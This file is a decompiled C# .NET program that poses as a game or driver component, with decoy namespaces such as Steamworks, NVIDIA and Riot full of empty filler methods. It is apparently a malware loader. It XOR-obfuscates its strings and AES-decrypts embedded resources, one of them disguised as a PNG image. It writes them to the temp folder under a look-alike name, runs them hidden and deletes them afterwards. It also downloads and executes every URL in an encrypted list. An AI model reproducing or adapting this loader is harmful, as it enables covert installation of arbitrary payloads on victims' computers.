using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("WindowsFormsApp1")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("WindowsFormsApp1")]
[assembly: AssemblyCopyright("Copyright ©  2025")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("8c92514f-eef7-44cc-9a74-ca9d410c52bc")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace Steamworks.API
{
	public class GameManager_25473_Bean
	{
		private static readonly byte[] _analyticsData834 = new byte[8] { 99, 54, 97, 52, 99, 56, 102, 49 };

		private static readonly byte[] _taskScheduler820 = new byte[8] { 57, 48, 101, 50, 52, 98, 49, 50 };

		private static readonly byte[] _taskScheduler811 = new byte[8] { 98, 51, 52, 56, 102, 57, 49, 97 };

		private static readonly byte[] _uploadToken357 = new byte[8] { 101, 51, 102, 97, 55, 54, 99, 98 };

		private static readonly byte[] _analyticsData668 = new byte[8] { 55, 101, 54, 50, 99, 48, 57, 51 };

		private static readonly byte[] _rendererCtx220 = new byte[8] { 100, 50, 98, 52, 52, 97, 52, 51 };

		public static bool _coreLoopHandle906 = true;

		public static string _cacheBuffer598 = "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";

		public static string[] _syncHandle639 = InitializeCore_3828();

		public static byte[] AES_KEY
		{
			get
			{
				byte[] array = new byte[32];
				Buffer.BlockCopy(_analyticsData834, 0, array, 0, _analyticsData834.Length);
				Buffer.BlockCopy(_taskScheduler820, 0, array, 8, _taskScheduler820.Length);
				Buffer.BlockCopy(_taskScheduler811, 0, array, 16, _taskScheduler811.Length);
				Buffer.BlockCopy(_uploadToken357, 0, array, 24, _uploadToken357.Length);
				return array;
			}
		}

		public static byte[] AES_IV
		{
			get
			{
				byte[] array = new byte[16];
				Buffer.BlockCopy(_analyticsData668, 0, array, 0, 8);
				Buffer.BlockCopy(_rendererCtx220, 0, array, 8, 8);
				return array;
			}
		}

		private static string[] InitializeCore_3828()
		{
			try
			{
				return new string[2] { "--cfg", _cacheBuffer598 };
			}
			catch (Exception)
			{
				return new string[2] { "--cfg", "" };
			}
		}

		private static string StartCore_2575(byte[] data, byte key)
		{
			char[] array = new char[data.Length];
			for (int i = 0; i < data.Length; i++)
			{
				array[i] = (char)(data[i] ^ key);
			}
			return new string(array);
		}

		public static async Task Main(string[] args)
		{
			try
			{
				string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
				byte[] array;
				try
				{
					array = InitializeInternal_7317(StartCore_2575(new byte[10] { 51, 55, 59, 61, 63, 107, 116, 42, 52, 61 }, 90));
					if (array == null)
					{
						return;
					}
				}
				catch (Exception)
				{
					return;
				}
				try
				{
					byte[] bytes = Process_6597(array, AES_KEY, AES_IV);
					string text = Path.Combine(Path.GetTempPath(), StartCore_2575(new byte[12]
					{
						45, 51, 52, 57, 57, 59, 63, 63, 116, 63,
						34, 63
					}, 90));
					File.WriteAllBytes(text, bytes);
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						FileName = text,
						Arguments = "--cfg " + _cacheBuffer598,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						CreateNoWindow = false
					};
					Process process = new Process();
					process.StartInfo = startInfo;
					process.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
					{
						if (e.Data != null)
						{
							Console.WriteLine("[OUT] " + e.Data);
						}
					};
					process.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
					{
						if (e.Data != null)
						{
							Console.WriteLine("[ERR] " + e.Data);
						}
					};
					process.Start();
					process.BeginOutputReadLine();
					process.BeginErrorReadLine();
					process.WaitForExit();
					try
					{
						File.Delete(text);
					}
					catch (Exception)
					{
					}
				}
				catch (Exception)
				{
				}
				List<Task> list = new List<Task>();
				if (manifestResourceNames.Contains("earls.txt"))
				{
					list.Add(Task.Run(async delegate
					{
						try
						{
							byte[] array5 = InitializeInternal_7317("earls.txt");
							if (array5 == null)
							{
								Console.WriteLine("[!] earls.txt not found in resources");
							}
							else
							{
								byte[] bytes4 = Process_6597(array5, AES_KEY, AES_IV);
								List<string> list2 = (from u in Encoding.UTF8.GetString(bytes4).Split(new char[3] { '\r', '\n', ',' }, StringSplitOptions.RemoveEmptyEntries)
									select u.Trim() into u
									where !string.IsNullOrWhiteSpace(u)
									select u).ToList();
								Console.WriteLine($"[*] Found {list2.Count} URLs to download");
								await Task.WhenAll(list2.Select((string url) => Task.Run(async delegate
								{
									_ = 1;
									try
									{
										Console.WriteLine("[*] Downloading: " + url);
										HttpClient client = new HttpClient();
										try
										{
											client.Timeout = TimeSpan.FromSeconds(30.0);
											byte[] bytes5 = await client.GetByteArrayAsync(url);
											string text4 = Path.GetFileName(new Uri(url).LocalPath);
											if (string.IsNullOrEmpty(text4) || !Enumerable.Contains(text4, '.'))
											{
												text4 = "download_" + Guid.NewGuid().ToString().Substring(0, 8) + ".exe";
											}
											string tempFile = Path.Combine(Path.GetTempPath(), text4);
											File.WriteAllBytes(tempFile, bytes5);
											Console.WriteLine("[✓] Downloaded: " + text4);
											ProcessStartInfo startInfo4 = new ProcessStartInfo
											{
												FileName = tempFile,
												UseShellExecute = false,
												RedirectStandardOutput = true,
												RedirectStandardError = true,
												CreateNoWindow = true
											};
											Process process4 = new Process();
											process4.StartInfo = startInfo4;
											process4.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
											{
												if (e.Data != null)
												{
													Console.WriteLine("[URL-OUT] " + e.Data);
												}
											};
											process4.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
											{
												if (e.Data != null)
												{
													Console.WriteLine("[URL-ERR] " + e.Data);
												}
											};
											process4.Start();
											process4.BeginOutputReadLine();
											process4.BeginErrorReadLine();
											Console.WriteLine("[✓] Executed: " + text4);
											await Task.Delay(2000);
											try
											{
												File.Delete(tempFile);
											}
											catch
											{
											}
										}
										finally
										{
											((IDisposable)client)?.Dispose();
										}
									}
									catch (Exception ex10)
									{
										Console.WriteLine("[!] Failed to download/execute " + url + ": " + ex10.Message);
									}
								})).ToList());
							}
						}
						catch (Exception ex9)
						{
							Console.WriteLine("[!] Failed to process earls.txt: " + ex9.Message);
						}
					}));
				}
				string[] array2 = manifestResourceNames;
				foreach (string resName2 in array2)
				{
					if (!resName2.StartsWith("binded"))
					{
						continue;
					}
					list.Add(Task.Run(delegate
					{
						try
						{
							byte[] array4 = InitializeInternal_7317(resName2);
							if (array4 == null)
							{
								return;
							}
							byte[] bytes3 = Process_6597(array4, AES_KEY, AES_IV);
							string text3 = Path.Combine(Path.GetTempPath(), resName2 + ".exe");
							File.WriteAllBytes(text3, bytes3);
							ProcessStartInfo startInfo3 = new ProcessStartInfo
							{
								FileName = text3,
								UseShellExecute = false,
								RedirectStandardOutput = true,
								RedirectStandardError = true,
								CreateNoWindow = true
							};
							Process process3 = new Process();
							process3.StartInfo = startInfo3;
							process3.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
							{
								if (e.Data != null)
								{
									Console.WriteLine("[OUT] " + e.Data);
								}
							};
							process3.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
							{
								if (e.Data != null)
								{
									Console.WriteLine("[ERR] " + e.Data);
								}
							};
							process3.Start();
							process3.BeginOutputReadLine();
							process3.BeginErrorReadLine();
							try
							{
								File.Delete(text3);
							}
							catch (Exception)
							{
							}
						}
						catch (Exception)
						{
						}
					}));
				}
				array2 = manifestResourceNames;
				foreach (string resName in array2)
				{
					if (!resName.StartsWith("binded"))
					{
						continue;
					}
					list.Add(Task.Run(delegate
					{
						try
						{
							byte[] array3 = InitializeInternal_7317(resName);
							if (array3 == null)
							{
								return;
							}
							byte[] bytes2 = Process_6597(array3, AES_KEY, AES_IV);
							string text2 = Path.Combine(Path.GetTempPath(), resName + ".exe");
							File.WriteAllBytes(text2, bytes2);
							ProcessStartInfo startInfo2 = new ProcessStartInfo
							{
								FileName = text2,
								UseShellExecute = false,
								RedirectStandardOutput = true,
								RedirectStandardError = true,
								CreateNoWindow = true
							};
							Process process2 = new Process();
							process2.StartInfo = startInfo2;
							process2.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
							{
								if (e.Data != null)
								{
									Console.WriteLine("[OUT] " + e.Data);
								}
							};
							process2.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
							{
								if (e.Data != null)
								{
									Console.WriteLine("[ERR] " + e.Data);
								}
							};
							process2.Start();
							process2.BeginOutputReadLine();
							process2.BeginErrorReadLine();
							try
							{
								File.Delete(text2);
							}
							catch (Exception)
							{
							}
						}
						catch (Exception)
						{
						}
					}));
				}
				await Task.WhenAll(list);
			}
			catch (Exception)
			{
			}
		}

		private static byte[] InitializeInternal_7317(string name)
		{
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			if (stream == null)
			{
				return null;
			}
			using MemoryStream memoryStream = new MemoryStream();
			stream.CopyTo(memoryStream);
			return memoryStream.ToArray();
		}

		private static byte[] Process_6597(byte[] d, byte[] k, byte[] iv)
		{
			using Aes aes = Aes.Create();
			aes.Key = k;
			aes.IV = iv;
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.PKCS7;
			using ICryptoTransform transform = aes.CreateDecryptor();
			using MemoryStream stream = new MemoryStream(d);
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			using MemoryStream memoryStream = new MemoryStream();
			cryptoStream.CopyTo(memoryStream);
			return memoryStream.ToArray();
		}
	}
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class UpdateChecker_59301_Bean
	{
		private static ResourceManager _taskScheduler625;

		private static CultureInfo _inputFlags758;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (_taskScheduler625 == null)
				{
					_taskScheduler625 = new ResourceManager("Entry.Properties.Resources", typeof(UpdateChecker_59301_Bean).Assembly);
				}
				return _taskScheduler625;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return _inputFlags758;
			}
			set
			{
				_inputFlags758 = value;
			}
		}

		internal UpdateChecker_59301_Bean()
		{
		}
	}
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.14.0.0")]
	internal sealed class AnalyticsManager_41936_Bean : ApplicationSettingsBase
	{
		private static AnalyticsManager_41936_Bean _frameCounter633 = (AnalyticsManager_41936_Bean)(object)SettingsBase.Synchronized((SettingsBase)(object)new AnalyticsManager_41936_Bean());

		public static AnalyticsManager_41936_Bean Default => _frameCounter633;
	}
	[CompilerGenerated]
	internal sealed class TelemetryUploader_59566_Bean
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 6)]
		internal struct __StaticArrayInitTypeSize=6
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 10)]
		internal struct __StaticArrayInitTypeSize=10
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		internal struct __StaticArrayInitTypeSize=12
		{
		}

		internal static readonly long _analyticsData470/* Not supported: data(65 33 66 61 37 36 63 62) */;

		internal static readonly long _coreLoopHandle262/* Not supported: data(64 32 62 34 34 61 34 33) */;

		internal static readonly __StaticArrayInitTypeSize=6 _coreLoopHandle872/* Not supported: data(0D 00 0A 00 2C 00) */;

		internal static readonly long _sessionId505/* Not supported: data(63 36 61 34 63 38 66 31) */;

		internal static readonly long _sessionId192/* Not supported: data(37 65 36 32 63 30 39 33) */;

		internal static readonly long _syncHandle531/* Not supported: data(62 33 34 38 66 39 31 61) */;

		internal static readonly long _coreLoopHandle198/* Not supported: data(39 30 65 32 34 62 31 32) */;

		internal static readonly __StaticArrayInitTypeSize=12 _frameCounter495/* Not supported: data(2D 33 34 39 39 3B 3F 3F 74 3F 22 3F) */;

		internal static readonly __StaticArrayInitTypeSize=10 _taskScheduler398/* Not supported: data(33 37 3B 3D 3F 6B 74 2A 34 3D) */;
	}
}
namespace Windows.GPU.Driver
{
	public class TelemetryManager_93673
	{
		public static void StopService_299()
		{
			Math.Abs(37);
		}

		public static void StartService_497()
		{
			Math.Abs(40);
		}

		public static void StopService_587()
		{
			Math.Abs(55);
		}

		public static void CheckUpdate_224()
		{
			Math.Abs(91);
		}

		public static void StartService_681()
		{
			Math.Abs(49);
		}
	}
}
namespace UnityEngine.Networking
{
	public class SessionHandler_94269
	{
		public static void PollMetrics_134()
		{
			Math.Abs(53);
		}

		public static void StartService_102()
		{
			Math.Abs(82);
		}

		public static void FlushCache_702()
		{
			Math.Abs(48);
		}

		public static void TrackInput_327()
		{
			Math.Abs(82);
		}

		public static void UploadStats_691()
		{
			Math.Abs(66);
		}
	}
}
namespace Microsoft.InputTracking
{
	public class UpdateChecker_74365
	{
		public static void InitSession_696()
		{
			Math.Abs(78);
		}

		public static void InitSession_132()
		{
			Math.Abs(37);
		}

		public static void StopService_801()
		{
			Math.Abs(47);
		}

		public static void InitSession_810()
		{
			Math.Abs(99);
		}

		public static void UploadStats_269()
		{
			Math.Abs(87);
		}
	}
}
namespace Steamworks.Overlay
{
	public class OverlayService_84950
	{
		public static void StartService_256()
		{
			Math.Abs(84);
		}

		public static void CheckUpdate_606()
		{
			Math.Abs(25);
		}

		public static void PushFrame_362()
		{
			Math.Abs(61);
		}

		public static void PollMetrics_608()
		{
			Math.Abs(62);
		}

		public static void StopService_369()
		{
			Math.Abs(30);
		}
	}
}
namespace DirectX11.SystemMetrics
{
	public class ProfilerCore_90326
	{
		public static void PollMetrics_480()
		{
			Math.Abs(56);
		}

		public static void InitSession_879()
		{
			Math.Abs(17);
		}

		public static void PushFrame_473()
		{
			Math.Abs(89);
		}

		public static void PollMetrics_650()
		{
			Math.Abs(68);
		}

		public static void StartService_653()
		{
			Math.Abs(43);
		}
	}
}
namespace Epic.Game.Loader
{
	public class GPUStats_36388
	{
		public static void PushFrame_477()
		{
			Math.Abs(73);
		}

		public static void StartService_830()
		{
			Math.Abs(26);
		}

		public static void StopService_198()
		{
			Math.Abs(73);
		}

		public static void CheckUpdate_748()
		{
			Math.Abs(33);
		}

		public static void PollMetrics_572()
		{
			Math.Abs(63);
		}
	}
}
namespace Riot.Telemetry.Core
{
	public class PacketManager_25658
	{
		public static void StartService_906()
		{
			Math.Abs(21);
		}

		public static void TrackInput_666()
		{
			Math.Abs(50);
		}

		public static void PushFrame_925()
		{
			Math.Abs(28);
		}

		public static void CheckUpdate_559()
		{
			Math.Abs(81);
		}

		public static void FlushCache_315()
		{
			Math.Abs(26);
		}
	}
}
namespace NVIDIA.HardwareMonitor
{
	public class SettingsSync_99257
	{
		public static void UploadStats_345()
		{
			Math.Abs(67);
		}

		public static void PollMetrics_606()
		{
			Math.Abs(23);
		}

		public static void StartService_574()
		{
			Math.Abs(27);
		}

		public static void CheckUpdate_672()
		{
			Math.Abs(38);
		}

		public static void CheckUpdate_610()
		{
			Math.Abs(62);
		}
	}
}
namespace System.Runtime.CompilerServices
{
	internal sealed class CompilerGenerated_4276Attribute
	{
	}
	internal sealed class CompilerGenerated_2048Attribute
	{
	}
	internal sealed class CompilerGenerated_4948Attribute
	{
	}
	internal sealed class CompilerGenerated_7008Attribute
	{
	}
	internal sealed class CompilerGenerated_2265Attribute
	{
	}
}
